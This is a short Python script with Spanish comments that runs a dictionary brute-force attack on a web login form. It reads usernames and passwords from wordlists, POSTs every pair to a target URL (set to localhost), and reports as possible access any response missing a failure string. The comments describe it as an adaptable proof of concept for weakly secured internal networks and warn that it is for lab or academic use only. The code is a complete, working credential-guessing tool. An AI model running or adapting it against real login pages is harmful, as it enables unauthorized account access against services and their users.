#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
#Autor: gstxx
#Script: Fuerza Bruta para Login
#POC de propósito general en ataques de diccionario, verión moldeable.
#Este scipt tiene mayor relevancia y utilidad para ataques de red interna con casi nula seguridad, usando formularios básicos.
#Esta herramienta debe complementarse con (F12) de el navegador de su preferencia, para ver los mensajes de error, Payload y uno que otro detalle importante al momento de enviar credenciales errorneas.
#Con esto se visualiza como funciona el formulario
#  ATENCION
# NO usar este script en entornos REALES, este script se desarrolló para entornos de laboratorio o simplemente de forma académica para comprender este tipo de ataques y poder protegerse.

import requests

"""
Script de Fuerza Bruta para Login

Este script intenta realizar un ataque de fuerza bruta contra un formulario de login web.
Utiliza listas de usuarios y contraseñas para probar combinaciones mediante peticiones POST.
Propiedad de gstxx, no utilice en entornos reales
"""

#configuracion inicial
url = "http://127.0.0.1:5000/login"  #URL del objetivo
usuarios = "usuarios.txt"             #Archivo con lista de usuarios (uno por línea)                {DATO MODIFICABLE}
wordlist = "diccionario.txt"          #Archivo con lista de contraseñas (una por línea)             {DATO MODIFICABLE}
patron_fallo = "Mensaje de fallo cuando hay login incorrecto"  #Patrón que indica login fallido     {DATO MODIFICABLE}

#Procesamiento de archivos
with open(usuarios, "r", encoding="utf-8", errors="ignore") as fu:
    for usuario in fu:
        usuario = usuario.rstrip("\n")  #Limpieza de salto de línea
        
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as fc:
            for contra in fc:
                contra = contra.rstrip("\n")  #Limpieza de salto de línea
                
                #Construcción del payload de la petición
                data = {
                    "logintoken": "Ingresa_El_Token_de_Acceso_O_Algun_dato_complementario",  #Token CSRF (si es requerido)         {DATO MODIFICABLE O ELIMINABLE}
                    "username": usuario,#               {DATO MODIFICABLE}
                    "password": contra,#                {DATO MODIFICABLE}
                    #Parámetros adicionales
                    #Parámetros adicionales
                    #Parámetros adicionales
                }

                try:
                    #Envío de la petición POST
                    r = requests.post(url, data=data, timeout=10)
                except requests.exceptions.RequestException as e:
                    print(f"[ERROR conexión] {e}")
                    continue  #Continuar con siguiente intento en caso de error

                #Verificación de respuesta
                if patron_fallo not in r.text:
                    #Posible acceso exitoso
                    print(f"\n[ACCESO POSIBLE] USUARIO: '{usuario}' | CONTRASEÑA: '{contra}'\n")
                    break  #Salir del bucle de contraseñas para este usuario
                else:
                    #Credenciales incorrectas
                    print(f"Usuario: '{usuario}' | Contraseña inválida: '{contra}'")